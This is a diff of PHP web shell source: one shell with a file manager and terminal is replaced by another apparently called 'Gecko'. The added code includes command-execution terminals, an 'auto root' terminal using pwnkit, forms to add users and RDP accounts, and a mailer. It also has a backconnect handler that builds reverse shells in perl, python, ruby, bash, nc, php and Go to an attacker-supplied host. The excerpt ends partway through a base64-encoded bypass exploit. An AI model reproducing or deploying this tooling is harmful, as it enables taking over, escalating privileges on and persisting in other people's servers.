+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
+                            </tr>
+                        <?php endif; ?>
+                    <?php endforeach; ?>
+                    <!-- Gecko Files Manager -->
+                    <?php foreach ($file_manager as $_F) : ?>
+                        <?php if ($fungsi[3]($_F)) : ?>
+                            <tr>
+                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a></td>
+                                <td><?= formatSize(filesize($_F)); ?></td>
+                                <td>
+                                    <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
+                                        echo '<font color="#00ff00">';
+                                    } elseif (!is_readable($fungsi[0]() . '/' . $_F)) {
+                                        echo '<font color="red">';
+                                    }
+                                    echo perms($fungsi[0]() . '/' . $_F);
+                                    ?>
+                                </td>
+                                <!-- Action File Manager -->
+                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
+                            </tr>
+                        <?php endif; ?>
+                    <?php endforeach; ?>
+                </tbody>
+        </table>
+        <br>
+        <select name="gecko-select" class="btn-submit">
+            <option value="delete">Delete</option>
+            <option value="unzip">Unzip</option>
+            <option value="zip">Zip</option><br>
+        </select>
+        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
+        </form>
+
+        <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
+        <div class="modal">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div id="modal-body-bc"></div>
+                        <span id="modal-input"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
+                        </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    </div>
+    <?php if (isset($_GET['backconnect'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: Backconnect</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <select class="bc-gecko box-shadow" name="gecko-bc">
+                            <option value="-">Choose Backconnect</option>
+                            <option value="perl">Perl</option>
+                            <option value="python">Python</option>
+                            <option value="ruby">Ruby</option>
+                            <option value="bash">Bash</option>
+                            <option value="php">php</option>
+                            <option value="nc">nc</option>
+                            <option value="sh">sh</option>
+                            <option value="xterm">Xterm</option>
+                            <option value="golang">Golang</option>
+                        </select>
+                        <input type="text" name="backconnect-host" class="modal-create-input" placeholder="127.0.0.1">
+                        <br><br>
+                        <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
+            </div>
+        </div>
     <?php endif; ?>
-    function closePopup() {
-        var p = document.getElementById('popup');
-        var o = document.querySelector('.popup-overlay');
-        if (p) { p.classList.add('hide'); }
-        if (o) { o.style.opacity = '0'; }
-        setTimeout(function(){ if (p) p.remove(); if (o) o.remove(); }, 300);
-    }
-    document.addEventListener('keydown', function(e){
-        if (e.key === 'Enter' || e.key === 'Escape') closePopup();
-    });
-</script>
-<?php endif; ?>
-
-<!-- INFO BAR -->
-<div class="info-bar">
-    <div class="info-logo"><img src="<?=htmlspecialchars($LOGO)?>" alt="Logo"></div>
-    <div class="info-content">
-        <div class="info-title-row">
-            <span class="info-title"><?=htmlspecialchars($APP_NAME)?></span>
-            <span class="live-badge">LIVE</span>
-            <div class="info-top-actions">
-                <button type="button" class="terminal-btn" onclick="openTerminal()"><?=icon('terminal',12)?> Terminal</button>
-                <a href="?p=<?=urlencode($START)?>"><?=icon('home',12)?> Home</a>
-                <a href="?logout=1" class="logout"><?=icon('logout',12)?> Logout</a>
+    <?php if (isset($_GET['mailer'])) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">:: PHP Mailer</i></b></h3>
+                </div>
+                <form action="" method="post">
+                    <div class="modal-body">
+                        <div class="modal-isi">
+                            <form action="" method="post">
+                                <div class="modal-mail-text">
+                                    <textarea name="message-smtp" class="box-shadow mail" placeholder="&nbsp;Your Text here!"></textarea>
+                                </div>
+                                <br>
+                                <input type="text" name="mailto-subject" class="modal-create-input" placeholder="Subject">
+                                <br><br>
+                                <input type="email" name="mail-from-smtp" class="modal-create-input" placeholder="from : example@mail.com">
+                                <br><br>
+                                <input type="email" name="mail-to-smtp" class="modal-create-input" placeholder="to : example@mail.com">
+                        </div>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
+                        </div>
+                </form>
             </div>
         </div>
-        <div class="info-chips">
-            <span class="chip"><?=icon('lock',11)?> <b><?=htmlspecialchars($user)?></b>@<?=htmlspecialchars($hostname)?></span>
-            <span class="chip"><?=htmlspecialchars($uname)?></span>
-            <span class="chip">PHP <b><?=PHP_VERSION?></b></span>
-            <span class="chip pct"><?=icon('folder',11)?> <?=htmlspecialchars($hddTxt)?> (<?=$hddPct?>%)</span>
-        </div>
-    </div>
-</div>
-
-<!-- PWD BAR -->
-<div class="pwd-bar">
-    <?=icon('folder',15)?>
-    <span class="lbl">PWD</span>
-    <span class="pwd-crumbs">
-        <?php foreach ($absParts as $i => $ap):
-            $isLast = ($i === $absLast);
-            $absTarget = $ap['abs'];
-        ?>
-            <?php if ($i === 0): ?>
-                <a href="?p=<?=urlencode('/')?>" class="seg root <?=$isLast?'current':''?>" title="Filesystem root"><?=icon('home',11)?> /</a>
-            <?php else: ?>
-                <span class="sep">/</span>
-                <?php if ($isLast): ?>
-                    <span class="seg current" title="<?=htmlspecialchars($ap['abs'])?>"><?=htmlspecialchars($ap['label'])?></span>
-                <?php else: ?>
-                    <a href="?p=<?=urlencode($absTarget)?>" class="seg" title="<?=htmlspecialchars($ap['abs'])?>"><?=htmlspecialchars($ap['label'])?></a>
-                <?php endif; ?>
-            <?php endif; ?>
-        <?php endforeach; ?>
-    </span>
-    <span class="tag">[ <?=htmlspecialchars($APP_NAME)?> ]</span>
-</div>
-
-<!-- TOOLBAR -->
-<div class="toolbar">
-    <div class="tool">
-        <div class="lbl-top"><?=icon('upload',11)?> Upload File</div>
-        <form method="post" enctype="multipart/form-data">
-            <input type="file" name="file" required>
-            <button type="submit" class="btn"><?=icon('upload',11)?> Upload</button>
-        </form>
-    </div>
-    <div class="tool">
-        <div class="lbl-top"><?=icon('file',11)?> Buat File</div>
-        <form method="post">
-            <input type="text" name="newfile" placeholder="nama.txt" required>
-            <button type="submit" class="btn"><?=icon('plus',11)?> Buat</button>
-        </form>
-    </div>
-    <div class="tool">
-        <div class="lbl-top"><?=icon('folder',11)?> Buat Folder</div>
-        <form method="post">
-            <input type="text" name="newfolder" placeholder="nama-folder" required>
-            <button type="submit" class="btn"><?=icon('plus',11)?> Buat</button>
-        </form>
-    </div>
-</div>
-
-<!-- TABLE -->
-<div class="table-wrap">
-<table>
-    <thead>
-        <tr>
-            <th>Nama</th>
-            <th class="hide-mobile">Size</th>
-            <th class="hide-mobile">Perms</th>
-            <th class="hide-mobile">Modified</th>
-            <th style="text-align:right">Actions</th>
-        </tr>
-    </thead>
-    <tbody>
-        <?php 
-        // === FOLDER SECTION ===
-        if (count($folders) > 0):
-        ?>
-        <tr class="divider-row folders">
-            <td colspan="5">
-                <div class="dv-inner">
-                    <?=icon('folder',11)?> FOLDERS
-                    <span class="dv-count"><?=count($folders)?></span>
+    <?php endif; ?>
+    <?php if ($_GET['f']) : ?>
+        <div class="code-editor">
+            <div class="code-editor-container">
+                <div class="code-editor-head">
+                    <h3><i class="fa-solid fa-code"></i>&nbsp; Code Editor : <?= unx($_GET['f']); ?></h3>
                 </div>
-            </td>
-        </tr>
-        <?php
-        $i = 0;
-        foreach ($folders as $it):
-            $i++;
-            $full = $path.'/'.$it;
-            $perms = substr(sprintf('%o', @fileperms($full)), -4);
-            $mtime = date('Y-m-d H:i', @filemtime($full));
-            $absTarget = rtrim($path, '/') . '/' . $it;
-            $link = '?p='.urlencode($absTarget);
-        ?>
-        <tr style="animation-delay:<?=min($i*0.02,0.4)?>s">
-            <td>
-                <div class="name-cell folder">
-                    <?=icon('folder',15)?>
-                    <a href="<?=$link?>"><?=htmlspecialchars($it)?></a>
+                <div class="code-editor-body">
+                    <form action="" method="post">
+                        <textarea name="code-editor" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
+                        </div>
+                    </form>
                 </div>
-            </td>
-            <td class="meta hide-mobile">—</td>
-            <td class="hide-mobile"><span class="perm"><?=$perms?></span></td>
-            <td class="meta hide-mobile"><?=$mtime?></td>
-            <td>
-                <div class="actions">
-                    <a href="#" onclick="renameItem('<?=htmlspecialchars(addslashes($it))?>');return false;" class="act rename" title="Rename"><?=icon('edit-pencil',13)?></a>
-                    <a href="#" onclick="chmodItem('<?=htmlspecialchars(addslashes($it))?>','<?=$perms?>');return false;" class="act chmod" title="Chmod"><?=icon('chmod',13)?></a>
-                    <a href="?p=<?=urlencode($path)?>&del=<?=urlencode($it)?>" 
-                       class="act danger folder-del" 
-                       title="Hapus folder + semua isi" 
-                       onclick="return confirmDelete('<?=htmlspecialchars(addslashes($it))?>', true);">
-                        <?=icon('trash',13)?>
-                    </a>
-                </div>
-            </td>
-        </tr>
-        <?php endforeach; 
-        endif;
-        
-        // === FILE SECTION ===
-        if (count($files) > 0):
-        ?>
-        <tr class="divider-row files">
-            <td colspan="5">
-                <div class="dv-inner">
-                    <?=icon('file',11)?> FILES
-                    <span class="dv-count"><?=count($files)?></span>
-                </div>
-            </td>
-        </tr>
-        <?php
-        $i = 0;
-        foreach ($files as $it):
-            $i++;
-            $full = $path.'/'.$it;
-            $size = round(@filesize($full)/1024, 2).' KB';
-            $perms = substr(sprintf('%o', @fileperms($full)), -4);
-            $mtime = date('Y-m-d H:i', @filemtime($full));
-            $link = '?p='.urlencode($path).'&edit='.urlencode($it);
-        ?>
-        <tr style="animation-delay:<?=min($i*0.02,0.4)?>s">
-            <td>
-                <div class="name-cell file">
-                    <?=icon('file',15)?>
-                    <a href="<?=$link?>"><?=htmlspecialchars($it)?></a>
-                </div>
-            </td>
-            <td class="meta hide-mobile"><?=$size?></td>
-            <td class="hide-mobile"><span class="perm"><?=$perms?></span></td>
-            <td class="meta hide-mobile"><?=$mtime?></td>
-            <td>
-                <div class="actions">
-                    <a href="?p=<?=urlencode($path)?>&dl=<?=urlencode($it)?>" class="act" title="Download"><?=icon('download',13)?></a>
-                    <a href="#" onclick="renameItem('<?=htmlspecialchars(addslashes($it))?>');return false;" class="act rename" title="Rename"><?=icon('edit-pencil',13)?></a>
-                    <a href="#" onclick="chmodItem('<?=htmlspecialchars(addslashes($it))?>','<?=$perms?>');return false;" class="act chmod" title="Chmod"><?=icon('chmod',13)?></a>
-                    <a href="?p=<?=urlencode($path)?>&del=<?=urlencode($it)?>" 
-                       class="act danger" 
-                       title="Hapus file" 
-                       onclick="return confirmDelete('<?=htmlspecialchars(addslashes($it))?>', false);">
-                        <?=icon('trash',13)?>
-                    </a>
-                </div>
-            </td>
-        </tr>
-        <?php endforeach; 
-        endif;
-        
-        // === EMPTY STATE ===
-        if (count($folders) === 0 && count($files) === 0): 
-        ?>
-        <tr><td colspan="5"><div class="empty">Folder kosong</div></td></tr>
-        <?php endif; ?>
-    </tbody>
-</table>
-</div>
-
-<!-- ===== TERMINAL MODAL ===== -->
-<div class="terminal-overlay" id="terminalOverlay" onclick="if(event.target===this) closeTerminal()">
-    <div class="terminal-box">
-        <div class="term-header">
-            <div class="term-dots">
-                <span class="d1"></span><span class="d2"></span><span class="d3"></span>
-            </div>
-            <div class="term-title"><?=icon('terminal',13)?> REHAN1337 @ <?=htmlspecialchars($hostname)?></div>
-            <button class="term-close" onclick="closeTerminal()" title="Close"><?=icon('x',13)?></button>
-        </div>
-        <div class="term-body" id="termBody" onclick="focusTermInput()">
-            <div class="term-line info-line">
-                Welcome to <b style="color:#4ade80">REHAN1337 Terminal</b> v1.0
-            </div>
-            <div class="term-line info-line">Type <b style="color:#4ade80">help</b> to see available commands.</div>
-            <div class="term-line info-line">────────────────────────────────────────</div>
-            <div id="termOutput"></div>
-            <div class="term-input-line">
-                <span class="term-prompt" id="termPrompt">
-                    <span class="user"><?=htmlspecialchars($user)?></span>@<span class="user"><?=htmlspecialchars($hostname)?></span>:<span class="path" id="termCwd"><?=htmlspecialchars($path)?></span><span class="sym">$</span>
-                </span>
-                <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="">
             </div>
         </div>
-        <div class="term-hint">
-            <span><kbd>↑</kbd> <kbd>↓</kbd> history · <kbd>Enter</kbd> execute · <kbd>Ctrl+L</kbd> clear</span>
-            <span id="termStatus">Ready</span>
+    <?php endif; ?>
+    <?php if ($_GET['terminal'] == "normal") : ?>
+        <div class="terminal">
+            <div class="terminal-container">
+                <div class="terminal-head">
+                    <ul>
+                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
+                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                    </ul>
+                </div>
+                <div class="terminal-body">
+                    <textarea class="box-shadow" disabled><?php
+                                                            if (isset($_POST['terminal'])) {
+                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
+                                                            }
+                                                            ?></textarea>
+                    <form action="" method="post">
+                        <ul>
+                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
         </div>
-    </div>
-</div>
+    <?php endif; ?>
+    <?php if ($_GET['terminal'] == "bypasser") : ?>
+        <div class="terminal">
+            <div class="terminal-container">
+                <div class="terminal-head">
+                    <ul>
+                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
+                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                    </ul>
+                </div>
+                <div class="terminal-body">
+                    <textarea class="box-shadow" disabled><?php
+                                                            if ($fungsi[3]('.term-bypass')) {
+                                                                include(".term-bypass");
+                                                                if (isset($_POST['terminal-bypass-submit'])) {
+                                                                    echo $fungsi[10](pwn($_POST['terminal-bypass'] . " 2>&1"));
+                                                                }
+                                                            }
+                                                            ?></textarea>
+                    <form action="" method="post">
+                        <ul>
+                            <li><input type="text" name="terminal-bypass" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="submit" name="terminal-bypass-submit" value=">" class="btn-modal-close"></li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['terminal'] == "root") : ?>
+        <div class="terminal">
+            <div class="terminal-container">
+                <div class="terminal-head">
+                    <ul>
+                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
+                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                    </ul>
+                </div>
+                <div class="terminal-body">
+                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
+                                                    $response = $fungsi[11]('.mad-root');
+                                                    $r_text = explode(" ", $response);
+                                                    if ($r_text[0] == "uid=0(root)") {
+                                                        if (isset($_POST['submit-root'])) {
+                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
+                                                        }
+                                                    } else {
+                                                        echo "This Device Is Not Vulnerable\n";
+                                                        echo cmd('lsb_release -a') . "\n";
+                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
+                                                    }
+                                                } else {
+                                                    $fungsi[24]('.mad-root');
+                                                } ?></textarea>
+                    <form action="" method="post">
+                        <ul>
+                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
+                            <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['re'] == true) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">Rename : <?= unx($_GET['re']) ?></i></b></h3>
+                </div>
+                <div class="modal-body">
+                    <form action="" method="post">
+                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['ch'] == true) : ?>
+        <div class="modal active">
+            <div class="modal-container">
+                <div class="modal-header">
+                    <h3><b><i id="modal-title">Change Permission : <?= unx($_GET['ch']) ?></i></b></h3>
+                </div>
+                <div class="modal-body">
+                    <form action="" method="post">
+                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
+                        <div class="modal-btn-form">
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        </div>
+    <?php endif; ?>
+    <script>
+        $(document).ready(function() {
+            $('#create_folder').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
+                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
+                event.preventDefault();
+            });
+            $('#create_file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
+                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
+                event.preventDefault();
+            });
+            $('#lock-file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
+                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
+                event.preventDefault();
+            });
+            $('#lock-windows').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE WINDOWS');
+                $('#modal-input').html('<input type="text" name="lock-windows" class="modal-create-input" placeholder="Your File Name">');
+                event.preventDefault();
+            });
+            $('#root-user').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
+                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
 
-<form method="post" id="renameForm" style="display:none">
-    <input type="hidden" name="rename_from" id="rf">
-    <input type="hidden" name="rename_to" id="rt">
-</form>
-<form method="post" id="chmodForm" style="display:none">
-    <input type="hidden" name="chmod_file" id="cf">
-    <input type="hidden" name="chmod_mode" id="cm">
-</form>
+            $('#create-rdp').click(function() {
+                $('.modal').show();
+                $('#modal-title').html(':: CREATE RDP');
+                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
 
-<script>
-// ============ FILE ACTIONS ============
-function renameItem(name) {
-    var n = prompt("Rename:", name);
-    if (n && n !== name) {
-        document.getElementById('rf').value = name;
-        document.getElementById('rt').value = n;
-        document.getElementById('renameForm').submit();
+            $('#close-modal').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+            $('#close-editor').click(function() {
+                $('.code-editor').hide();
+                event.preventDefault();
+            });
+
+            $('.close-terminal').click(function() {
+                $('.terminal').hide();
+                event.preventDefault();
+            });
+            $('.close-btn-s').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+        });
+    </script>
+</body>
+
+</html>
+<?php
+
+
+if (isset($_POST['submit-bc'])) {
+    $HostServer = $_POST['backconnect-host'];
+    $PortServer = $_POST['backconnect-port'];
+    if ($_POST['gecko-bc'] == "perl") {
+        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
+    } else if ($_POST['gecko-bc'] == "python") {
+        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
+    } else if ($_POST['gecko-bc'] == "ruby") {
+        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
+    } else if ($_POST['gecko-bc'] == "bash") {
+        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
+    } else if ($_POST['gecko-bc'] == "php") {
+        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');exec("/bin/sh -i <&3 >&3 2>&3");\'');
+    } else if ($_POST['gecko-bc'] == "nc") {
+        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
+    } else if ($_POST['gecko-bc'] == "sh") {
+        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
+    } else if ($_POST['gecko-bc'] == "xterm") {
+        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
+    } else if ($_POST['gecko-bc'] == "golang") {
+        echo cmd('echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
     }
 }
-function chmodItem(name, cur) {
-    var m = prompt("Chmod (octal):", cur);
-    if (m) {
-        document.getElementById('cf').value = name;
-        document.getElementById('cm').value = m;
-        document.getElementById('chmodForm').submit();
-    }
-}
-function confirmDelete(name, isDir) {
-    if (isDir) {
-        return confirm("HAPUS FOLDER?\n\n'" + name + "'\n\nSemua isi di dalamnya juga akan terhapus permanen!\n\nLanjutkan?");
-    }
-    return confirm("Hapus file '" + name + "'?");
-}
 
-// ============ TERMINAL ============
-const termOverlay = document.getElementById('terminalOverlay');
-const termBody    = document.getElementById('termBody');
-const termInput   = document.getElementById('termInput');
-const termOutput  = document.getElementById('termOutput');
-const termCwd     = document.getElementById('termCwd');
-const termStatus  = document.getElementById('termStatus');
 
-let termCwdValue = <?=json_encode($path)?>;
-let termHistory  = [];
-let termHistIdx  = -1;
-let termBusy     = false;
-
-function openTerminal() {
-    termOverlay.classList.add('active');
-    setTimeout(() => { termInput.focus(); }, 100);
-    // Refresh prompt path
-    termCwd.textContent = termCwdValue;
-    termStatus.textContent = 'Ready';
-}
-function closeTerminal() {
-    termOverlay.classList.remove('active');
-}
-function focusTermInput() {
-    // Jangan fokus kalau user sedang select text
-    if (!window.getSelection().toString()) {
-        termInput.focus();
-    }
-}
-function termScrollBottom() {
-    termBody.scrollTop = termBody.scrollHeight;
-}
-function termEscape(s) {
-    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-}
-function termAppend(text, cls) {
-    if (text === '__CLEAR__') { termClear(); return; }
-    const div = document.createElement('div');
-    div.className = 'term-line ' + (cls || '');
-    div.textContent = text;
-    termOutput.appendChild(div);
-    termScrollBottom();
-}
-function termAppendCmd(cmd) {
-    const div = document.createElement('div');
-    div.className = 'term-line cmd-line';
-    div.innerHTML = '<span class="term-prompt">'
-        + '<span class="user"><?=htmlspecialchars($user)?></span>@'
-        + '<span class="user"><?=htmlspecialchars($hostname)?></span>:'
-        + '<span class="path">' + termEscape(termCwdValue) + '</span>'
-        + '<span class="sym">$</span></span> ' + termEscape(cmd);
-    termOutput.appendChild(div);
-    termScrollBottom();
-}
-function termClear() {
-    termOutput.innerHTML = '';
-    termStatus.textContent = 'Cleared';
-}
-
-async function termRun(cmd) {
-    if (termBusy) return;
-    cmd = cmd.trim();
-    if (cmd === '') return;
-
-    termHistory.push(cmd);
-    termHistIdx = termHistory.length;
-
-    termAppendCmd(cmd);
-    termBusy = true;
-    termStatus.textContent = 'Running...';
-
-    try {
-        const fd = new FormData();
-        fd.append('terminal_cmd', cmd);
-        fd.append('cwd', termCwdValue);
-        fd.append('prev_cwd', window.__prevCwd || termCwdValue);
-
-        const res = await fetch('', { method: 'POST', body: fd });
-        const data = await res.json();
-
-        if (data.cwd && data.cwd !== termCwdValue) {
-            window.__prevCwd = termCwdValue;
-            termCwdValue = data.cwd;
-        }
-        termCwd.textContent = termCwdValue;
-
-        if (data.output) {
-            // Deteksi error sederhana
-            const isErr = /error|not found|denied|cannot|no such|invalid|missing|gagal/i.test(data.output)
-                       && !/^\s*$/.test(data.output);
-            termAppend(data.output, isErr ? 'err-line' : '');
-        }
-        termStatus.textContent = 'Ready';
-    } catch (e) {
-        termAppend('Error: ' + e.message, 'err-line');
-        termStatus.textContent = 'Error';
-    } finally {
-        termBusy = false;
-        termInput.focus();
-        termScrollBottom();
+if ($_GET['terminal'] == "bypasser") {
+    if (!$fungsi[3]('.term-bypass') && $fungsi[4]($fungsi[0]())) {
+        $connt = 'PD9waHAKZnVuY3Rpb24gcHduKCRjbWRkKSB7CiAgICBnbG9iYWwgJGFiYywgJGhlbHBlciwgJGJhY2t0cmFjZTsKCiAgICBjbGFzcyBWdWxuIHsKICAgICAgICBwdWJsaWMgJGE7CiAgICAgICAgcHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKSB7IAogICAgICAgICAgICBnbG9iYWwgJGJhY2t0cmFjZTsgCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hKTsKICAgICAgICAgICAgJGJhY2t0cmFjZSA9IChuZXcgRXhjZXB0aW9uKS0+Z2V0VHJhY2UoKTsgIyA7KQogICAgICAgICAgICBpZighaXNzZXQoJGJhY2t0cmFjZVsxXVsnYXJncyddKSkgeyAjIFBIUCA+PSA3LjQKICAgICAgICAgICAgICAgICRiYWNrdHJhY2UgPSBkZWJ1Z19iYWNrdHJhY2UoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBIZWxwZXIgewogICAgICAgIHB1YmxpYyAkYSwgJGIsICRjLCAkZDsKICAgIH0KCiAgICBmdW5jdGlvbiBzdHIycHRyKCYkc3RyLCAkcCA9IDAsICRzID0gOCkgewogICAgICAgICRhZGRyZXNzID0gMDsKICAgICAgICBmb3IoJGogPSAkcy0xOyAkaiA+PSAwOyAkai0tKSB7CiAgICAgICAgICAgICRhZGRyZXNzIDw8PSA4OwogICAgICAgICAgICAkYWRkcmVzcyB8PSBvcmQoJHN0clskcCskal0pOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7CiAgICB9CgogICAgZnVuY3Rpb24gcHRyMnN0cigkcHRyLCAkbSA9IDgpIHsKICAgICAgICAkb3V0ID0gIiI7CiAgICAgICAgZm9yICgkaT0wOyAkaSA8ICRtOyAkaSsrKSB7CiAgICAgICAgICAgICRvdXQgLj0gY2hyKCRwdHIgJiAweGZmKTsKICAgICAgICAgICAgJHB0ciA+Pj0gODsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRvdXQ7CiAgICB9CgogICAgZnVuY3Rpb24gd3JpdGUoJiRzdHIsICRwLCAkdiwgJG4gPSA4KSB7CiAgICAgICAgJGkgPSAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpI